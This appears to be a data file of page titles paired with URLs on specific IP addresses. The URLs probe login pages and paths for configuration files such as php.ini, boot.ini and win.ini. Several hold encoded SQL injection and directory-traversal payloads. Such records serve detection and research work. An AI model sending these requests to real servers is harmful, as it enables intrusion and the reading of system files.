web,http://194.68.44.90:8080/LoginPage.do/LoginPage.do/LoginPage.do/administrator/components/com_a6mambocredits/php.ini
Docutek ERes - Admin Login - asterisk.management.portal,http://203.105.229.182/login/pageid/wp-content/plugins/ioptimization/perform.ini
web server status,http://61.64.230.138/login/gs/include/odbc.ini
curriculum vitae,http://103.224.193.144/login/1220/servlet/preferences.ini
VMware,http://175.96.49.163/login/suse/inc//%2522ftp://perform.ini
"\""Big",http://103.225.3.163/login%2522%2BAND%2B%25221%2522%3D%25221%2522%2B--%2B/php.ini
Flash Operator Panel - Data Frame - Browser not HTTP 1.1 compatible,http://210.202.233.163/login/%2522nph-proxy.cgi/hp//..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fboot.ini
"\""System",http://185.14.187.205:84/login/.br/perform.ini
CUPS) - Password,http://210.242.149.140/login/axis-cgi/8003/php.ini
PHPBTTracker Statistics,http://210.200.17.175/loginsave/lib////////windows/win.ini.ini
